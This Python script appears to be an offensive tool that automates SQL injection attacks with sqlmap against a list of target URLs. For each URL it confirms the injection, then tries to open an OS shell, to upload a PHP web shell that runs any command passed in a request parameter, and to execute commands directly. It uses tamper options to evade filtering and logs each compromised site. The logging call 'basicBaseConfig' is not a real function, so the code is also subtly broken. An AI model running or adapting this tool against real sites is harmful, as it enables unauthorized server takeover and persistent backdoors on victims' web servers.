import subprocess
import json
import os
import logging
import time
from typing import List, Dict, Optional
from urllib.parse import urlparse
import requests
from colorama import init, Fore, Style
from settings import TARGET_FILE_PATH, TARGET, TARGET_FILE_CHECK # type: ignore

init(autoreset=True)

# setting.json dosyasını oku
with open(os.path.join(os.path.dirname(__file__), 'config', 'setting.json'), 'r', encoding='utf-8') as f:
    setting = json.load(f)

# Directory and file paths
SCAN_RESULTS_DIR = "scan_results"
SHELL_RESULTS_FILE = os.path.join(SCAN_RESULTS_DIR, "shell_scanner.txt")
LOG_DIR = os.path.join("log", "sql_inj")
LOG_FILE = os.path.join(LOG_DIR, "shell_scanner_log.txt")
OUTPUT_DIR = "sql_exploits"

# Configure logging
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logging.basicBaseConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class SQLiShellExploiter:
    def __init__(self):
        self.sqlmap_base_args = [
            "sqlmap", "-v3", "--batch", 
            f"--threads={setting.get('sqlmap_threads', 10)}",
            "--output-dir", OUTPUT_DIR, 
            f"--level={setting.get('sqlmap_level', 3)}", 
            f"--risk={setting.get('sqlmap_risk', 3)}",
            "--tamper=space2comment,randomcase"
        ]
        self.exploit_methods = [
            self.try_os_shell,
            self.try_file_upload,
            self.try_command_execution
        ]

    def run_sqlmap_scan(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Run initial sqlmap scan to confirm vulnerability."""
        try:
            args = self.sqlmap_base_args + ["-u", url]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
            
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "is vulnerable" in result.stdout.lower() or "confirmed" in result.stdout.lower():
                logging.info(f"SQLmap confirmed vulnerability for {url}")
                print(f"{Fore.GREEN}[+] SQLmap confirmed vulnerability for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"SQLmap scan timed out for {url}")
            print(f"{Fore.RED}[-] SQLmap scan timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"SQLmap scan error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] SQLmap scan error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_os_shell(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt to gain OS shell access."""
        try:
            args = self.sqlmap_base_args + ["-u", url, "--os-shell"]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "web application OS shell" in result.stdout.lower():
                logging.info(f"OS shell successful for {url}")
                print(f"{Fore.GREEN}[+] OS shell gained for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"OS shell attempt timed out for {url}")
            print(f"{Fore.RED}[-] OS shell attempt timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"OS shell error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] OS shell error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_file_upload(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt to upload a malicious file."""
        try:
            shell_content = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>"""
            shell_path = os.path.join(OUTPUT_DIR, "shell.php")
            with open(shell_path, "w") as f:
                f.write(shell_content)
                
            args = self.sqlmap_base_args + [
                "-u", url,
                "--file-write", shell_path,
                "--file-dest", setting.get('shell_upload_path', "/var/www/html/shell.php")
            ]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "file uploaded successfully" in result.stdout.lower():
                parsed = urlparse(url)
                shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.php"
                try:
                    response = requests.get(shell_url, timeout=setting.get('request_timeout', 10))
                    if response.status_code == 200:
                        logging.info(f"File upload successful for {url} - Shell at {shell_url}")
                        print(f"{Fore.GREEN}[+] Shell uploaded to {shell_url}{Style.RESET_ALL}")
                        return True
                except requests.RequestException:
                    logging.warning(f"Shell uploaded but not accessible at {shell_url}")
                    print(f"{Fore.YELLOW}[!] Shell uploaded but not accessible at {shell_url}{Style.RESET_ALL}")
                    return False
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"File upload attempt timed out for {url}")
            print(f"{Fore.RED}[-] File upload attempt timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"File upload error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] File upload error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_command_execution(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt direct command execution."""
        try:
            args = self.sqlmap_base_args + ["-u", url, "--os-cmd", setting.get('test_command', "whoami")]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "command output" in result.stdout.lower():
                logging.info(f"Command execution successful for {url}")
                print(f"{Fore.GREEN}[+] Command execution successful for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"Command execution timed out for {url}")
            print(f"{Fore.RED}[-] Command execution timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"Command execution error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] Command execution error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def load_vulnerable_urls(self) -> List[Dict]:
        """Load URLs from setting.json based on TARGET_FILE_CHECK."""
        vulnerable_urls = []
        
        if setting.get('TARGET_FILE_CHECK', 'off').lower() == "on":
            if not os.path.exists(TARGET_FILE_PATH):
                logging.error(f"Target file not found: {TARGET_FILE_PATH}")
                print(f"{Fore.RED}[-] Target file not found: {TARGET_FILE_PATH}{Style.RESET_ALL}")
                return []
            try:
                with open(TARGET_FILE_PATH, "r") as f:
                    for line in f:
                        url = line.strip()
                        if url:
                            vuln_info = {'url': url, 'db_type': 'Unknown', 'parameter': None}
                            vulnerable_urls.append(vuln_info)
                logging.info(f"Loaded {len(vulnerable_urls)} URLs from {TARGET_FILE_PATH}")
                print(f"{Fore.CYAN}[*] Loaded {len(vulnerable_urls)} URLs from {TARGET_FILE_PATH}{Style.RESET_ALL}")
            except Exception as e:
                logging.error(f"Error loading {TARGET_FILE_PATH}: {str(e)}")
                print(f"{Fore.RED}[-] Error loading {TARGET_FILE_PATH}: {str(e)}{Style.RESET_ALL}")
        else:
            if not setting.get('TARGET'):
                logging.error("No target specified in setting.json")
                print(f"{Fore.RED}[-] No target specified in setting.json{Style.RESET_ALL}")
                return []
            vulnerable_urls.append({'url': setting.get('TARGET'), 'db_type': 'Unknown', 'parameter': None})
            logging.info(f"Loaded single URL from setting.json: {setting.get('TARGET')}")
            print(f"{Fore.CYAN}[*] Loaded target URL: {setting.get('TARGET')}{Style.RESET_ALL}")
        
        return vulnerable_urls

    def save_results(self, successful_exploits: List[Dict], failed_urls: List[str]) -> None:
        """Save successful exploit results to shell_scanner.txt."""
        if not os.path.exists(SCAN_RESULTS_DIR):
            os.makedirs(SCAN_RESULTS_DIR)
        
        with open(SHELL_RESULTS_FILE, "a") as f:
            for exploit in successful_exploits:
                f.write(json.dumps(exploit) + "\n")
        
        # Log both successful and failed attempts
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n\n=== Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            log_file.write("\nSUCCESSFUL EXPLOITS:\n")
            for exploit in successful_exploits:
                log_file.write(f"URL: {exploit['url']}\n")
                log_file.write(f"Method: {exploit['method']}\n")
                log_file.write(f"Timestamp: {exploit['timestamp']}\n")
                log_file.write("----------------------------------------\n")
            
            log_file.write("\nFAILED EXPLOITS:\n")
            for url in failed_urls:
                log_file.write(f"{url}\n")

    def exploit_url(self, vuln_info: Dict) -> Optional[Dict]:
        """Attempt to exploit a single URL and return result if successful."""
        url = vuln_info['url']
        print(f"{Fore.CYAN}[*] Processing {url}{Style.RESET_ALL}")
        logging.info(f"Starting processing for {url}")

        # Run initial sqlmap scan
        if not self.run_sqlmap_scan(url, vuln_info):
            print(f"{Fore.YELLOW}[-] SQLmap could not confirm vulnerability for {url}{Style.RESET_ALL}")
            logging.info(f"SQLmap scan failed to confirm vulnerability for {url}")
            return None

        # Try exploitation methods
        for method in self.exploit_methods:
            if method(url, vuln_info):
                result = {
                    'url': url,
                    'method': method.__name__,
                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                }
                print(f"{Fore.GREEN}[+] Exploitation successful for {url} using {method.__name__}{Style.RESET_ALL}")
                return result
            
        print(f"{Fore.YELLOW}[-] No successful exploitation for {url}{Style.RESET_ALL}")
        logging.info(f"No successful exploitation for {url}")
        return None

def run_sqli_shell() -> None:
    start_time = time.time()
    
    # Create output directory
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    exploiter = SQLiShellExploiter()
    vulnerable_urls = exploiter.load_vulnerable_urls()
    
    if not vulnerable_urls:
        print(f"{Fore.RED}[-] No URLs found to exploit{Style.RESET_ALL}")
        logging.error("No URLs found to exploit")
        return

    print(f"{Fore.CYAN}[*] Found {len(vulnerable_urls)} URLs to process{Style.RESET_ALL}")
    
    successful_exploits = []
    failed_urls = []
    
    for vuln_info in vulnerable_urls:
        result = exploiter.exploit_url(vuln_info)
        if result:
            successful_exploits.append(result)
        else:
            failed_urls.append(vuln_info['url'])

    # Save results
    exploiter.save_results(successful_exploits, failed_urls)

    # Print summary
    elapsed_time = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Exploitation Summary:")
    print(f"Total URLs processed: {len(vulnerable_urls)}")
    print(f"Successful exploits: {len(successful_exploits)}")
    print(f"Failed exploits: {len(failed_urls)}")
    print(f"Execution time: {elapsed_time:.2f} seconds{Style.RESET_ALL}")
    
    logging.info(
        f"Exploitation completed. "
        f"Processed: {len(vulnerable_urls)}, "
        f"Successful: {len(successful_exploits)}, "
        f"Failed: {len(failed_urls)}, "
        f"Time: {elapsed_time:.2f} seconds"
    )

if __name__ == "__main__":
    run_sqli_shell()